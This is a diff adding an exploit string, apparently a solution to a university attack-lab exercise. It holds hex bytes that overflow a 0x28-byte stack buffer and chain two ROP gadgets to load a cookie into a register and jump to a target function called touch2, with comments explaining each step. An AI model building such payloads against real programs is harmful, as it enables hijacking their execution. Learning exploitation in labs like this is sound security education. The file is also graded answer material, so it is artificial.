@@ -1,0 +1,13 @@
+/* stack size: 0x28 */
+/* touch2: 4017ec */
+/* cookie: 0x59b997fa */
+
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /* fill stack */
+ab 19 40 00 00 00 00 00 /* getbuf return address: addval_219 + 0x4; popq $rax */
+fa 97 b9 59 00 00 00 00 /* cookie value to be popped to $rax */
+a2 19 40 00 00 00 00 00 /* gadget addval_219 return address: addval_273 + 0x2; movq $rax,$rdi */
+ec 17 40 00 00 00 00 00 /* gadget addval_273 return address: touch2 */
